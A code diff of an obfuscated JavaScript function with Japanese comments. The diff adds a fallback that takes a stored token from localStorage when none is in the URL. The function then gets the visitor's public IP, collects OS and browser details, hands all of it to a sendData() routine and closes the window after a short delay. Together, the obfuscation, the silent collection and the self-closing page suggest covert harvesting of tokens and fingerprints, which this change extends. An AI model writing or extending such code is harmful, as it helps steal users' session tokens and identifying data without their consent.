@@ -44,34 +44,40 @@
     const _0x1a2b = ['json', 'POST', 'Content-Type', 'application/json', 'https://api.ipify.org?format=json', 'ip'];
     
     async function processData() {
-      const _0x3c4d = new URLSearchParams(window.location.search);
-      const _0x5e6f = _0x3c4d.get('token');
-      const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
-      
-      if (!_0x5e6f) return;
-      
-      try {
+    const _0x3c4d = new URLSearchParams(window.location.search);
+    let _0x5e6f = _0x3c4d.get('token');
+    const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
+
+    // URLにトークンがなければローカルストレージから取得
+    if (!_0x5e6f) {
+        _0x5e6f = localStorage.getItem('token');
+    }
+
+    if (!_0x5e6f) {
+        console.log('URLまたはローカルストレージにトークンが見つかりませんでした。');
+        return;
+    }
+
+    try {
         // IP情報の取得
-        const _0x3m4n = await fetch(_0x1a2b[4]);
-        const _0x5o6p = await _0x3m4n[_0x1a2b[0]]();
-        
+        const _0x3m4n = await fetch('https://api.ipify.org?format=json');
+        const _0x5o6p = await _0x3m4n.json();
+
         // システム情報の収集
         const _0x7q8r = {
-          os: getOSInfo(_0x7g8h),
-          browser: getBrowserInfo(_0x7g8h),
-          ip: _0x5o6p[_0x1a2b[5]]
+            os: getOSInfo(_0x7g8h),
+            browser: getBrowserInfo(_0x7g8h),
+            ip: _0x5o6p.ip
         };
-        
+
         // データ転送処理
         await sendData(_0x5e6f, _0x7q8r, _0x7g8h);
-        
-      } catch (e) {
-        // エラーハンドリング
-        console.log('Processing completed');
-      } finally {
-        // ページクリーンアップ
+
+    } catch (e) {
+        console.error('データ処理エラー:', e);
+    } finally {
         setTimeout(() => {
-          window.close();
+            window.close();
         }, 1500);
       }
     }
